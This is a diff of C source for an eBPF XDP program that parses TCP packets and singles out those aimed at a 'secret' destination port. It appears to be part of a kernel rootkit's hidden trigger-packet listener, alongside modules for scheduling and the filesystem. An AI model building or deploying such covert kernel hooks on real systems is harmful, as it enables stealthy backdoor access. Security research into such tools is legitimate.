@@ -1,5 +1,5 @@
-//#include "newvmlinux.h"
-#include <unistd.h>
+//Linux system includes
+/*#include <unistd.h>
 #include <stdbool.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
@@ -13,37 +13,32 @@
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
-#include <linux/udp.h>
+#include <linux/udp.h>*/
 
-#include <linux/bpf.h>
+
+#include "headervmlinux.h"
+
+//BPF & libbpf dependencies
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
+#include <bpf/bpf_endian.h>
 
-#include "../user/xdp_filter.h"
-#include "../constants/constants.h"
+//User-kernel dependencies
+#include "../common/constants.h"
 
+//BPF exclusive includes
 #include "packet/packet_manager.h"
 #include "packet/protocol/tcp_helper.h"
 #include "xdp/xdp_helper.h"
-#include "common/common_utils.h"
+#include "utils/strings.h"
 
+//BPF modules to load
+#include "include/bpf/sched.h"
+#include "include/bpf/fs.h"
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
-
-//BPF map
-/*struct {
-	__uint(type, BPF_MAP_TYPE_HASH);
-	__uint(max_entries, 8192);
-	__type(key, pid_t);
-	__type(value, char[5]);
-} exec_start SEC(".maps");*/
-
-//Ring buffer
-/*struct {
-	__uint(type, BPF_MAP_TYPE_RINGBUF);
-	__uint(max_entries, 256 * 1024);
-} rb SEC(".maps");*/
+#define ETH_ALEN 6
 
 //Ethernet frame struct
 struct eth_hdr {
@@ -54,8 +49,7 @@ struct eth_hdr {
 
 
 SEC("xdp_prog")
-int xdp_receive(struct xdp_md *ctx)
-{
+int xdp_receive(struct xdp_md *ctx){
     //bpf_printk("BPF triggered\n");
     
     void *data_end = (void *)(long)ctx->data_end;
@@ -81,7 +75,7 @@ int xdp_receive(struct xdp_md *ctx)
     }
 
     if (get_protocol(data) != IPPROTO_TCP){
-        bpf_printk("C");
+        //bpf_printk("C");
         return XDP_PASS;
     }
 
@@ -92,11 +86,11 @@ int xdp_receive(struct xdp_md *ctx)
     }
 
     if (get_tcp_dest_port(tcp) != SECRET_PACKET_DEST_PORT){
-        bpf_printk("E %i\n", ntohs(tcp->dest));
+        bpf_printk("E %i\n", bpf_ntohs(tcp->dest));
         return XDP_PASS;
     }
 
-    payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
+    payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     payload = (void *)tcp + tcp->doff*4;
 
     // We use "size - 1" to account for the final '\0', but depending on the program use
@@ -151,7 +145,7 @@ int xdp_receive(struct xdp_md *ctx)
             return XDP_PASS;
         }
 
-        payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
+        payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
         payload = (void *)tcp + tcp->doff*4;
         
         //Quite a trick to avoid the verifier complaining when it's clear we are OK with the payload
